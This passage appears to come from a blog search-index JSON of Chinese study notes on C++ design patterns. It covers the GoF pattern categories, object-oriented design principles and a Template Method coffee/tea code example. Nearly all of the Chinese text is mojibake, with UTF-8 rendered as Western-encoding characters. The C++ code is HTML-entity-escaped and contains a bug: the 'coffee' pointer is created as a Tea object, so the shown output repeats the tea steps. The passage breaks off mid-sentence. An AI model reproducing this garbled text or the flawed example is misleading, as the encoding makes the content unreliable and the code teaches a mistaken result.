åˆ›å»ºå‹æ¨¡å¼çš„ä¸»è¦å…³æ³¨ç‚¹æ˜¯â€œæ€æ ·åˆ›å»ºå¯¹è±¡ï¼Ÿâ€ï¼Œå®ƒçš„ä¸»è¦ç‰¹ç‚¹æ˜¯â€œå°†å¯¹è±¡çš„åˆ›å»ºä¸ä½¿ç”¨åˆ†ç¦»â€ã€‚è¿™æ ·å¯ä»¥é™ä½ç³»ç»Ÿçš„è€¦åˆåº¦ï¼Œä½¿ç”¨è€…ä¸éœ€è¦å…³æ³¨å¯¹è±¡çš„åˆ›å»ºç»†èŠ‚ï¼Œå¯¹è±¡çš„åˆ›å»ºç”±ç›¸å…³çš„å·¥å‚æ¥å®Œæˆã€‚å°±åƒæˆ‘ä»¬å»å•†åœºè´­ä¹°å•†å“æ—¶ï¼Œä¸éœ€è¦çŸ¥é“å•†å“æ˜¯æ€ä¹ˆç”Ÿäº§å‡ºæ¥ä¸€æ ·ï¼Œå› ä¸ºå®ƒä»¬ç”±ä¸“é—¨çš„å‚å•†ç”Ÿäº§ã€‚ å•ä¾‹ï¼ˆSingletonï¼‰æ¨¡å¼ï¼šæŸä¸ªç±»åªèƒ½ç”Ÿæˆä¸€ä¸ªå®ä¾‹ï¼Œè¯¥ç±»æä¾›äº†ä¸€ä¸ªå…¨å±€è®¿é—®ç‚¹ä¾›å¤–éƒ¨è·å–è¯¥å®ä¾‹ï¼Œå…¶æ‹“å±•æ˜¯æœ‰é™å¤šä¾‹æ¨¡å¼ã€‚ åŸå‹ï¼ˆPrototypeï¼‰æ¨¡å¼ï¼šå°†ä¸€ä¸ªå¯¹è±¡ä½œä¸ºåŸå‹ï¼Œé€šè¿‡å¯¹å…¶è¿›è¡Œå¤åˆ¶è€Œå…‹éš†å‡ºå¤šä¸ªå’ŒåŸå‹ç±»ä¼¼çš„æ–°å®ä¾‹ã€‚ å·¥å‚æ–¹æ³•ï¼ˆFactoryMethodï¼‰æ¨¡å¼ï¼šå®šä¹‰ä¸€ä¸ªç”¨äºåˆ›å»ºäº§å“çš„æ¥å£ï¼Œç”±å­ç±»å†³å®šç”Ÿäº§ä»€ä¹ˆäº§å“ã€‚ æŠ½è±¡å·¥å‚ï¼ˆAbstractFactoryï¼‰æ¨¡å¼ï¼šæä¾›ä¸€ä¸ªåˆ›å»ºäº§å“æ—çš„æ¥å£ï¼Œå…¶æ¯ä¸ªå­ç±»å¯ä»¥ç”Ÿäº§ä¸€ç³»åˆ—ç›¸å…³çš„äº§å“ã€‚ å»ºé€ è€…ï¼ˆBuilderï¼‰æ¨¡å¼ï¼šå°†ä¸€ä¸ªå¤æ‚å¯¹è±¡åˆ†è§£æˆå¤šä¸ªç›¸å¯¹ç®€å•çš„éƒ¨åˆ†ï¼Œç„¶åæ ¹æ®ä¸åŒéœ€è¦åˆ†åˆ«åˆ›å»ºå®ƒä»¬ï¼Œæœ€åæ„å»ºæˆè¯¥å¤æ‚å¯¹è±¡ã€‚ è®¾è®¡æ¨¡å¼ä¹‹ç»“æ„å‹æ¨¡å¼(Structional)ï¼šå¦‚ä½•å®ç°ç±»æˆ–å¯¹è±¡çš„ç»„åˆï¼› ç»“æ„å‹æ¨¡å¼æè¿°å¦‚ä½•å°†ç±»æˆ–å¯¹è±¡æŒ‰æŸç§å¸ƒå±€ç»„æˆæ›´å¤§çš„ç»“æ„ã€‚å®ƒåˆ†ä¸ºç±»ç»“æ„å‹æ¨¡å¼å’Œå¯¹è±¡ç»“æ„å‹æ¨¡å¼ï¼Œå‰è€…é‡‡ç”¨ç»§æ‰¿æœºåˆ¶æ¥ç»„ç»‡æ¥å£å’Œç±»ï¼Œåè€…é‡†ç”¨ç»„åˆæˆ–èšåˆæ¥ç»„åˆå¯¹è±¡ã€‚ ç”±äºç»„åˆå…³ç³»æˆ–èšåˆå…³ç³»æ¯”ç»§æ‰¿å…³ç³»è€¦åˆåº¦ä½ï¼Œæ»¡è¶³â€œåˆæˆå¤ç”¨åŸåˆ™â€ï¼Œæ‰€ä»¥å¯¹è±¡ç»“æ„å‹æ¨¡å¼æ¯”ç±»ç»“æ„å‹æ¨¡å¼å…·æœ‰æ›´å¤§çš„çµæ´»æ€§ã€‚ ç»“æ„å‹æ¨¡å¼åˆ†ä¸ºä»¥ä¸‹ 7 ç§ï¼š ä»£ç†ï¼ˆProxyï¼‰æ¨¡å¼ï¼šä¸ºæŸå¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¯¥å¯¹è±¡çš„è®¿é—®ã€‚å³å®¢æˆ·ç«¯é€šè¿‡ä»£ç†é—´æ¥åœ°è®¿é—®è¯¥å¯¹è±¡ï¼Œä»è€Œé™åˆ¶ã€å¢å¼ºæˆ–ä¿®æ”¹è¯¥å¯¹è±¡çš„ä¸€äº›ç‰¹æ€§ã€‚ é€‚é…å™¨ï¼ˆAdapterï¼‰æ¨¡å¼ï¼šå°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦å¤–ä¸€ä¸ªæ¥å£ï¼Œä½¿å¾—åŸæœ¬ç”±äºæ¥å£ä¸å…¼å®¹è€Œä¸èƒ½ä¸€èµ·å·¥ä½œçš„é‚£äº›ç±»èƒ½ä¸€èµ·å·¥ä½œã€‚ æ¡¥æ¥ï¼ˆBridgeï¼‰æ¨¡å¼ï¼šå°†æŠ½è±¡ä¸å®ç°åˆ†ç¦»ï¼Œä½¿å®ƒä»¬å¯ä»¥ç‹¬ç«‹å˜åŒ–ã€‚å®ƒæ˜¯ç”¨ç»„åˆå…³ç³»ä»£æ›¿ç»§æ‰¿å…³ç³»æ¥å®ç°çš„ï¼Œä»è€Œé™ä½äº†æŠ½è±¡å’Œå®ç°è¿™ä¸¤ä¸ªå¯å˜ç»´åº¦çš„è€¦åˆåº¦ã€‚ è£…é¥°ï¼ˆDecoratorï¼‰æ¨¡å¼ï¼šåŠ¨æ€åœ°ç»™å¯¹è±¡å¢åŠ ä¸€äº›èŒè´£ï¼Œå³å¢åŠ å…¶é¢å¤–çš„åŠŸèƒ½ã€‚ å¤–è§‚ï¼ˆFacadeï¼‰æ¨¡å¼ï¼šä¸ºå¤šä¸ªå¤æ‚çš„å­ç³»ç»Ÿæä¾›ä¸€ä¸ªä¸€è‡´çš„æ¥å£ï¼Œä½¿è¿™äº›å­ç³»ç»Ÿæ›´åŠ å®¹æ˜“è¢«è®¿é—®ã€‚ äº«å…ƒï¼ˆFlyweightï¼‰æ¨¡å¼ï¼šè¿ç”¨å…±äº«æŠ€æœ¯æ¥æœ‰æ•ˆåœ°æ”¯æŒå¤§é‡ç»†ç²’åº¦å¯¹è±¡çš„å¤ç”¨ã€‚ ç»„åˆï¼ˆCompositeï¼‰æ¨¡å¼ï¼šå°†å¯¹è±¡ç»„åˆæˆæ ‘çŠ¶å±‚æ¬¡ç»“æ„ï¼Œä½¿ç”¨æˆ·å¯¹å•ä¸ªå¯¹è±¡å’Œç»„åˆå¯¹è±¡å…·æœ‰ä¸€è‡´çš„è®¿é—®æ€§ã€‚ è®¾è®¡æ¨¡å¼ä¹‹è¡Œä¸ºå‹æ¨¡å¼(Behavioral)ï¼šç±»æˆ–å¯¹è±¡æ€æ ·äº¤äº’ä»¥åŠæ€ä¹ˆåˆ†é…èŒè´£ã€‚ è¡Œä¸ºå‹æ¨¡å¼ç”¨äºæè¿°ç¨‹åºåœ¨è¿è¡Œæ—¶å¤æ‚çš„æµç¨‹æ§åˆ¶ï¼Œå³æè¿°å¤šä¸ªç±»æˆ–å¯¹è±¡ä¹‹é—´æ€æ ·ç›¸äº’åä½œå…±åŒå®Œæˆå•ä¸ªå¯¹è±¡éƒ½æ— æ³•å•ç‹¬å®Œæˆçš„ä»»åŠ¡ï¼Œå®ƒæ¶‰åŠç®—æ³•ä¸å¯¹è±¡é—´èŒè´£çš„åˆ†é…ã€‚ è¡Œä¸ºå‹æ¨¡å¼åˆ†ä¸ºç±»è¡Œä¸ºæ¨¡å¼å’Œå¯¹è±¡è¡Œä¸ºæ¨¡å¼ï¼Œå‰è€…é‡‡ç”¨ç»§æ‰¿æœºåˆ¶æ¥åœ¨ç±»é—´åˆ†æ´¾è¡Œä¸ºï¼Œåè€…é‡‡ç”¨ç»„åˆæˆ–èšåˆåœ¨å¯¹è±¡é—´åˆ†é…è¡Œä¸ºã€‚ç”±äºç»„åˆå…³ç³»æˆ–èšåˆå…³ç³»æ¯”ç»§æ‰¿å…³ç³»è€¦åˆåº¦ä½ï¼Œæ»¡è¶³â€œåˆæˆå¤ç”¨åŸåˆ™â€ï¼Œæ‰€ä»¥å¯¹è±¡è¡Œä¸ºæ¨¡å¼æ¯”ç±»è¡Œä¸ºæ¨¡å¼å…·æœ‰æ›´å¤§çš„çµæ´»æ€§ã€‚ è¡Œä¸ºå‹æ¨¡å¼æ˜¯ GoF è®¾è®¡æ¨¡å¼ä¸­æœ€ä¸ºåºå¤§çš„ä¸€ç±»ï¼Œå®ƒåŒ…å«ä»¥ä¸‹ 11 ç§æ¨¡å¼ã€‚ æ¨¡æ¿æ–¹æ³•ï¼ˆTemplate Methodï¼‰æ¨¡å¼ï¼šå®šä¹‰ä¸€ä¸ªæ“ä½œä¸­çš„ç®—æ³•éª¨æ¶ï¼Œå°†ç®—æ³•çš„ä¸€äº›æ­¥éª¤å»¶è¿Ÿåˆ°å­ç±»ä¸­ï¼Œä½¿å¾—å­ç±»åœ¨å¯ä»¥ä¸æ”¹å˜è¯¥ç®—æ³•ç»“æ„çš„æƒ…å†µä¸‹é‡å®šä¹‰è¯¥ç®—æ³•çš„æŸäº›ç‰¹å®šæ­¥éª¤ã€‚ ç­–ç•¥ï¼ˆStrategyï¼‰æ¨¡å¼ï¼šå®šä¹‰äº†ä¸€ç³»åˆ—ç®—æ³•ï¼Œå¹¶å°†æ¯ä¸ªç®—æ³•å°è£…èµ·æ¥ï¼Œä½¿å®ƒä»¬å¯ä»¥ç›¸äº’æ›¿æ¢ï¼Œä¸”ç®—æ³•çš„æ”¹å˜ä¸ä¼šå½±å“ä½¿ç”¨ç®—æ³•çš„å®¢æˆ·ã€‚ å‘½ä»¤ï¼ˆCommandï¼‰æ¨¡å¼ï¼šå°†ä¸€ä¸ªè¯·æ±‚å°è£…ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œä½¿å‘å‡ºè¯·æ±‚çš„è´£ä»»å’Œæ‰§è¡Œè¯·æ±‚çš„è´£ä»»åˆ†å‰²å¼€ã€‚ èŒè´£é“¾ï¼ˆChain of Responsibilityï¼‰æ¨¡å¼ï¼šæŠŠè¯·æ±‚ä»é“¾ä¸­çš„ä¸€ä¸ªå¯¹è±¡ä¼ åˆ°ä¸‹ä¸€ä¸ªå¯¹è±¡ï¼Œç›´åˆ°è¯·æ±‚è¢«å“åº”ä¸ºæ­¢ã€‚é€šè¿‡è¿™ç§æ–¹å¼å»é™¤å¯¹è±¡ä¹‹é—´çš„è€¦åˆã€‚ çŠ¶æ€ï¼ˆStateï¼‰æ¨¡å¼ï¼šå…è®¸ä¸€ä¸ªå¯¹è±¡åœ¨å…¶å†…éƒ¨çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶æ”¹å˜å…¶è¡Œä¸ºèƒ½åŠ›ã€‚ è§‚å¯Ÿè€…ï¼ˆObserverï¼‰æ¨¡å¼ï¼šå¤šä¸ªå¯¹è±¡é—´å­˜åœ¨ä¸€å¯¹å¤šå…³ç³»ï¼Œå½“ä¸€ä¸ªå¯¹è±¡å‘ç”Ÿæ”¹å˜æ—¶ï¼ŒæŠŠè¿™ç§æ”¹å˜é€šçŸ¥ç»™å…¶ä»–å¤šä¸ªå¯¹è±¡ï¼Œä»è€Œå½±å“å…¶ä»–å¯¹è±¡çš„è¡Œä¸ºã€‚ ä¸­ä»‹è€…ï¼ˆMediatorï¼‰æ¨¡å¼ï¼šå®šä¹‰ä¸€ä¸ªä¸­ä»‹å¯¹è±¡æ¥ç®€åŒ–åŸæœ‰å¯¹è±¡ä¹‹é—´çš„äº¤äº’å…³ç³»ï¼Œé™ä½ç³»ç»Ÿä¸­å¯¹è±¡é—´çš„è€¦åˆåº¦ï¼Œä½¿åŸæœ‰å¯¹è±¡ä¹‹é—´ä¸å¿…ç›¸äº’äº†è§£ã€‚ è¿­ä»£å™¨ï¼ˆIteratorï¼‰æ¨¡å¼ï¼šæä¾›ä¸€ç§æ–¹æ³•æ¥é¡ºåºè®¿é—®èšåˆå¯¹è±¡ä¸­çš„ä¸€ç³»åˆ—æ•°æ®ï¼Œè€Œä¸æš´éœ²èšåˆå¯¹è±¡çš„å†…éƒ¨è¡¨ç¤ºã€‚ è®¿é—®è€…ï¼ˆVisitorï¼‰æ¨¡å¼ï¼šåœ¨ä¸æ”¹å˜é›†åˆå…ƒç´ çš„å‰æä¸‹ï¼Œä¸ºä¸€ä¸ªé›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ æä¾›å¤šç§è®¿é—®æ–¹å¼ï¼Œå³æ¯ä¸ªå…ƒç´ æœ‰å¤šä¸ªè®¿é—®è€…å¯¹è±¡è®¿é—®ã€‚ å¤‡å¿˜å½•ï¼ˆMementoï¼‰æ¨¡å¼ï¼šåœ¨ä¸ç ´åå°è£…æ€§çš„å‰æä¸‹ï¼Œè·å–å¹¶ä¿å­˜ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œä»¥ä¾¿ä»¥åæ¢å¤å®ƒã€‚ è§£é‡Šå™¨ï¼ˆInterpreterï¼‰æ¨¡å¼ï¼šæä¾›å¦‚ä½•å®šä¹‰è¯­è¨€çš„æ–‡æ³•ï¼Œä»¥åŠå¯¹è¯­è¨€å¥å­çš„è§£é‡Šæ–¹æ³•ï¼Œå³è§£é‡Šå™¨ã€‚ ä»¥ä¸Š 11 ç§è¡Œä¸ºå‹æ¨¡å¼ï¼Œé™¤äº†æ¨¡æ¿æ–¹æ³•æ¨¡å¼å’Œè§£é‡Šå™¨æ¨¡å¼æ˜¯ç±»è¡Œä¸ºå‹æ¨¡å¼ï¼Œå…¶ä»–çš„å…¨éƒ¨å±äºå¯¹è±¡è¡Œä¸ºå‹æ¨¡å¼ã€‚ è®¾è®¡æ¨¡å¼ç›®å‰çš„ç§ç±»ï¼šGoFçš„23ç§ +â€œç®€ç­”å·¥å‚æ¨¡å¼â€ = 24ç§ è½¯ä»¶è®¾è®¡æ¨¡å¼æœ‰ä»€ä¹ˆç”¨ï¼Ÿ æœ‰åŠ©äºæ›´åŠ æ·±å…¥åœ°ç†è§£é¢å‘å¯¹è±¡æ€æƒ³ï¼Œè®©ä½ çŸ¥é“ï¼š 1. å¦‚ä½•å°†ä»£ç åˆ†æ•£åœ¨å‡ ä¸ªä¸åŒçš„ç±»ä¸­ 2. ä¸ºä»€ä¹ˆè¦æœ‰â€œæ¥å£â€ 3. ä½•ä¸ºé’ˆå¯¹æŠ½è±¡ç¼–ç¨‹ 4. åˆé€‚ä¸åº”è¯¥ä½¿ç”¨ç»§æ‰¿ 5. å¦‚ä½•ä¸ä¿®æ”¹æºä»£ç å¢åŠ æ–°åŠŸèƒ½ 6. æ›´å¥½åœ°é˜…è¯»å’Œç†è§£ç°æœ‰ç±»åº“ä¸å…¶ä»–ç³»ç»Ÿä¸­çš„æºä»£ç  å¦‚ä½•å­¦å¥½è®¾è®¡æ¨¡å¼ è®¾è®¡æ¨¡å¼çš„åŸºç¡€æ˜¯ï¼šå¤šæ€ï¼Œå‚è€ƒä¹¦ä¸Šç»™çš„å»ºè®®å°±æ˜¯ï¼š åˆå­¦è€…ï¼šç§¯ç´¯æ¡ˆä¾‹ï¼Œä¸è¦ç›²ç›®çš„èƒŒç±»å›¾ï¼ˆæˆ‘å°±æ˜¯ï¼‰ åˆçº§å¼€å‘äººå‘˜ï¼šå¤šæ€è€ƒï¼Œå¤šæ¢³ç†ï¼Œå½’çº³æ€»ç»“ï¼Œå°Šé‡äº‹ç‰©çš„è®¤çŸ¥è§„å¾‹ï¼Œæ³¨æ„ä¸´ç•Œç‚¹çš„çªç ´ï¼Œä¸è¦æµ®èºã€‚ ä¸­çº§å¼€å‘äººå‘˜ï¼šåˆé€‚çš„å¼€å‘ç¯å¢ƒï¼Œå¯»æ‰¾åˆé€‚çš„è®¾è®¡æ¨¡å¼æ¥è§£å†³é—®é¢˜ã€‚å¤šåº”ç”¨ï¼Œå¯¹ç»å…¸çš„ç»„åˆè®¾è®¡æ¨¡å¼ï¼Œå¤§é‡è‡ªç”±çš„è¿ç”¨ï¼Œè¦ä¸æ–­åœ°è¿½æ±‚ã€‚ å…³äºè¯­è¨€ è¯­è¨€æ˜¯åŸºç¡€ï¼Œå­¦ä¹ è®¾è®¡æ¨¡å¼ä¹‹å‰ä¸€å®šè¦å¯¹è‡ªå·±ç°åœ¨ä½¿ç”¨å’Œè¿ç”¨çš„è¯­è¨€åŠ ä»¥äº†è§£ï¼›ç†Ÿæ‚‰ã€æŒæ¡å¤šæ€ã€‚ Cå­¦ä¹ è€…å»ºè®®å¯ä»¥è¯»ä¸€éã€Šc Primer Plusã€‹ï¼Œå°¤å…¶æ˜¯é¢å‘å¯¹è±¡éƒ¨åˆ† è®¾è®¡æ¨¡å¼æ€»è§ˆ åˆ›å»ºå‹æ¨¡å¼ï¼ˆCreationalï¼‰ ç»“æ„å‹æ¨¡å¼(Structural) è¡Œä¸ºå‹æ¨¡å¼ï¼ˆBehavioralï¼‰ é¢å‘å¯¹è±¡è®¾è®¡åŸåˆ™ åç§° å®šä¹‰ å•ä¸€èŒè´£åŸåˆ™ï¼ˆSingle Responsibility Principle,SRP)â­ï¸â­ï¸â­ï¸â­ï¸ ç±»çš„èŒè´£å•ä¸€ï¼Œå¯¹å¤–åªæä¾›ä¸€ç§å¯èƒ½ï¼Œè€Œå¼•èµ·ç±»å˜åŒ–çš„åŸå› éƒ½åº”è¯¥åªæœ‰ä¸€ä¸ªã€‚ å¼€é—­åŸåˆ™ï¼ˆOpen-Closed Principle,OCP)â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸ ç±»çš„æ”¹åŠ¨æ˜¯é€šè¿‡å¢åŠ ä»£ç è¿›è¡Œçš„ï¼Œè€Œä¸æ˜¯ä¿®æ”¹æºä»£ç  é‡Œæ°ä»£æ¢åŸåˆ™(Liskov Substitution Principle,LSP)â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸ ä»»ä½•æŠ½è±¡ç±»å‡ºç°çš„åœ°æ–¹éƒ½å¯ä»¥ç”¨ä»–çš„å®ç°ç±»è¿›è¡Œæ›¿æ¢ï¼Œå®é™…å°±æ˜¯è™šæ‹Ÿæœºåˆ¶ï¼Œè¯­è¨€çº§åˆ«å®ç°é¢å‘å¯¹è±¡åŠŸèƒ½ã€‚ ä¾èµ–å€’è½¬åŸåˆ™ï¼ˆDependence Inversion Priciple,DIP)â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸ ä¾èµ–äºæŠ½è±¡ï¼ˆæ¥å£ï¼‰ï¼Œä¸è¦ä¾èµ–å…·ä½“çš„å®ç°ï¼ˆç±»ï¼‰ï¼Œä¹Ÿå°±æ˜¯é’ˆå¯¹æ¥å£ç¼–ç¨‹ã€‚ æ¥å£éš”ç¦»åŸåˆ™ï¼ˆInterface Segregation Principle,ISP)â­ï¸â­ï¸ ä¸åº”è¯¥å¼ºè¿«ç”¨æˆ·çš„ç¨‹åºä¾èµ–ä»–ä»¬ä¸éœ€è¦çš„æ¥å£æ–¹æ³•ã€‚ä¸€ä¸ªæ¥å£åªæä¾›ä¸€ç§å¯¹å¤–åŠŸèƒ½ï¼Œä¸åº”è¯¥æŠŠæ‰€æœ‰æ“ä½œéƒ½å°è£…åˆ°ä¸€ä¸ªæ¥å£ä¸­å»ã€‚ åˆæˆå¤ç”¨åŸåˆ™ï¼ˆComposite Reuse Principleï¼ŒCRP)â­ï¸â­ï¸â­ï¸â­ï¸ å¦‚æœä½¿ç”¨ç»§æ‰¿ï¼Œä¼šå¯¼è‡´çˆ¶ç±»çš„ä»»ä½•å˜åŒ–éƒ½å¯èƒ½å½±å“åˆ°å­ç±»çš„è¡Œä¸ºï¼Œå¦‚æœä½¿ç”¨å¯¹è±¡ç»„åˆï¼Œå°±é™ä½äº†è¿™ç§ä¾èµ–å…³ç³»ï¼Œå¯¹äºç»§æ‰¿å’Œç±»ï¼Œä¼˜å…ˆä½¿ç”¨è¯¥ç»„åˆã€‚ è¿ªç±³ç‰¹æ³•åˆ™ï¼ˆLaw of Demeter,LoD)â­ï¸â­ï¸â­ï¸ ä¸€ä¸ªå¯¹è±¡åº”å½“å¯¹å…¶ä»–å¯¹è±¡å°½å¯èƒ½å°‘çš„äº†è§£,ä»è€Œé™ä½å„ä¸ªå¯¹è±¡ä¹‹é—´çš„è€¦åˆ,æé«˜ç³»ç»Ÿçš„å¯ç»´æŠ¤æ€§ã€‚ä¾‹å¦‚åœ¨ä¸€ä¸ªç¨‹åºä¸­,å„ä¸ªæ¨¡å—ä¹‹é—´ç›¸äº’è°ƒç”¨æ—¶,é€šå¸¸ä¼šæä¾›- -ä¸ªç»Ÿ- -çš„æ¥å£æ¥å®ç°ã€‚è¿™æ ·å…¶ä»–æ¨¡å—ä¸éœ€è¦äº†è§£å¦å¤–ä¸€ä¸ªæ¨¡å—çš„å†…éƒ¨å®ç°ç»†èŠ‚, è¿™æ ·å½“ä¸€ä¸ªæ¨¡å—å†…éƒ¨çš„å®ç°å‘ç”Ÿæ”¹å˜æ—¶,ä¸ä¼šå½±å“å…¶ä»–æ¨¡å—çš„ä½¿ç”¨ã€‚( é»‘ç›’åŸç†) å€Ÿé‰´äº†ã€ŠEasyæå®šè®¾è®¡æ¨¡å¼ã€‹","tags":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"è®¾è®¡æ¨¡å¼/åˆ›å»ºå‹æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼-åˆ›å»ºå‹æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"B_è®¾è®¡æ¨¡å¼","slug":"A-å†…åŠŸ/B-è®¾è®¡æ¨¡å¼","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/B-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"è®¾è®¡æ¨¡å¼ä¹‹è¡Œä¸ºå‹æ¨¡å¼","date":"2023-12-25T01:28:27.247Z","path":"A_å†…åŠŸ/B_è®¾è®¡æ¨¡å¼/è¡Œä¸ºå‹æ¨¡å¼/","text":"è¡Œä¸ºå‹æ¨¡å¼ å­¦ä¹ ç¬”è®°ä¹‹C++è®¾è®¡æ¨¡å¼â€”â€”åˆ›å»ºå‹æ¨¡å¼ ğŸ“‘ è®¾è®¡æ¨¡å¼ä¹‹ç»“æ„å‹æ¨¡å¼ ğŸ“‘ è®¾è®¡æ¨¡å¼ä¹‹åˆ›å»ºå‹æ¨¡å¼ æ€»çš„æ¥è¯´ï¼Œè¡Œä¸ºå‹æ¨¡å¼å°±æ˜¯ç”¨æ¥å¯¹ç±»æˆ–å¯¹è±¡æ€æ ·äº¤äº’å’Œæ€æ ·åˆ†é…èŒè´£è¿›è¡Œæè¿°ã€‚ æ¨¡æ¿æ–¹æ³•æ¨¡å¼ AbstractClassï¼ˆæŠ½è±¡ç±»ï¼‰ï¼šåœ¨æŠ½è±¡ç±»ä¸­å®šä¹‰äº†ä¸€ç³»åˆ—åŸºæœ¬æ“ä½œï¼ˆPrimitiveOperationsï¼‰ï¼Œè¿™äº›åŸºæœ¬æ“ä½œå¯ä»¥æ˜¯å…·ä½“çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯æŠ½è±¡çš„ï¼Œæ¯ä¸€ä¸ªåŸºæœ¬æ“ä½œå¯¹åº”ç®—æ³•çš„ä¸€ä¸ªæ­¥éª¤ï¼Œåœ¨å…¶å­ç±»ä¸­å¯ä»¥é‡å®šä¹‰æˆ–å®ç°è¿™äº›æ­¥éª¤ã€‚åŒæ—¶ï¼Œåœ¨æŠ½è±¡ç±»ä¸­å®ç°äº†ä¸€ä¸ªæ¨¡æ¿æ–¹æ³•ï¼ˆTemplate Methodï¼‰ï¼Œç”¨äºå®šä¹‰ä¸€ä¸ªç®—æ³•çš„æ¡†æ¶ï¼Œæ¨¡æ¿æ–¹æ³•ä¸ä»…å¯ä»¥è°ƒç”¨åœ¨æŠ½è±¡ç±»ä¸­å®ç°çš„åŸºæœ¬æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨åœ¨æŠ½è±¡ç±»çš„å­ç±»ä¸­å®ç°çš„åŸºæœ¬æ–¹æ³•ï¼Œè¿˜å¯ä»¥è°ƒç”¨å…¶ä»–å¯¹è±¡ä¸­çš„æ–¹æ³•ã€‚ ConcreteClassï¼ˆå…·ä½“å­ç±»ï¼‰ï¼šå®ƒæ˜¯æŠ½è±¡ç±»çš„å­ç±»ï¼Œç”¨äºæ˜¯ç°åœ¨çˆ¶ç±»ä¸­å£°æ˜çš„æŠ½è±¡åŸºæœ¬æ“ä½œä»¥å®Œæˆå­ç±»ç‰¹å®šç®—æ³•çš„æ­¥éª¤ï¼Œä¹Ÿå¯ä»¥è¦†ç›–åœ¨çˆ¶ç±»ä¸­çš„å·²ç»å®ç°çš„å…·ä½“åŸºæœ¬æ“ä½œã€‚ æ¨¡æ¿æ–¹æ³•æ¡ˆä¾‹ ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485// æ¨¡æ¿æ–¹æ³•.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// åˆ¶ä½œé¥®æ–™class Beverage&#123;public: // ç…®æ°´ void BoilWater() &#123; cout &lt;&lt; &quot;çƒ§å¼€æ°´&quot; &lt;&lt; endl; &#125; // å†²æ³¡ ç‰¹æ®Šæ¥å£ virtual void Brew() = 0; // å€’å…¥æ¯ä¸­ void PourinVup() &#123; cout &lt;&lt; &quot;å€’å…¥æ¯ä¸­&quot; &lt;&lt; endl; &#125; // æ·»åŠ æ–™ ç‰¹æ®Šæ¥å£ virtual void AddCondiments() = 0; // hook æ–¹æ³•ï¼Œå†³å®šæŸäº›ç®—æ³•æ­¥éª¤æ˜¯å¦æŒ‚é’©åœ¨ç®—æ³•ä¸­ virtual bool CustomWantsCondiments() &#123; return true; &#125; // æ¨¡æ¿æ–¹æ³• void PrepareBeverage() &#123; BoilWater(); Brew(); PourinVup(); if (CustomWantsCondiments()) &#123; AddCondiments(); &#125; &#125;protected: private:&#125;;class Coffee : public Beverage&#123;public: virtual void Brew() &#123; cout &lt;&lt; &quot;å†²æ³¡å’–å•¡è±†&quot; &lt;&lt; endl; &#125; virtual void AddCondiments() &#123; cout &lt;&lt; &quot;æ·»åŠ ç³–å’Œç‰›å¥¶&quot; &lt;&lt; endl; &#125;protected:private:&#125;;class Tea : public Beverage&#123;public: virtual void Brew() &#123; cout &lt;&lt; &quot;å†²æ³¡èŒ¶å¶&quot; &lt;&lt; endl; &#125; virtual void AddCondiments() &#123; cout &lt;&lt; &quot;æ·»åŠ æŸ æª¬&quot; &lt;&lt; endl; &#125;protected:private:&#125;;int main()&#123; Beverage *pTea = new Tea; pTea-&gt;PrepareBeverage(); delete pTea; cout &lt;&lt; &quot;-----------------------&quot; &lt;&lt; endl; Beverage *pCoffee = new Tea; pCoffee-&gt;PrepareBeverage(); delete pCoffee; return 0;&#125; è¾“å‡ºï¼š çƒ§å¼€æ°´ å†²æ³¡èŒ¶å¶ å€’å…¥æ¯ä¸­ æ·»åŠ æŸ æª¬ ----------------------- çƒ§å¼€æ°´ å†²æ³¡èŒ¶å¶ å€’å…¥æ¯ä¸­ æ·»åŠ æŸ æª¬ è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . . ## æ¨¡æ¿æ–¹æ³•çš„ä¼˜ç¼ºç‚¹ åœ¨çˆ¶ç±»ä¸­å½¢å¼åŒ–åœ°å®šä¹‰ä¸€ä¸ªç®—æ³•ï¼Œè€Œç”±å®ƒçš„å­ç±»æ¥å®ç°ç»†èŠ‚çš„å¤„ç†ï¼Œåœ¨å­ç±»å®ç°è¯¦ç»†çš„å¤„ç†ç®—æ³•æ—¶å¹¶ä¸ä¼šæ”¹å˜ç®—æ³•ä¸­æ­¥éª¤çš„æ‰§è¡Œæ¬¡åºã€‚ æ¨¡æ¿æ–¹æ³•æ¨¡å¼æ˜¯ä¸€ç§ä»£ç 